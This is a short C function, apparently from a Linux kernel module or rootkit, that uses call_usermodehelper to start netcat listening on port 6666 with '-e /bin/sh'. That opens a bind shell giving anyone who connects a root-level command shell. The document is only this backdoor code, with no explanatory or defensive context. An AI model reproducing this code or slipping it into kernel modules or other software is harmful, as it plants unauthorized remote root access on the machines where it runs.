void shell_tasklet_fn(unsigned long data){
	static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL};
	call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);
}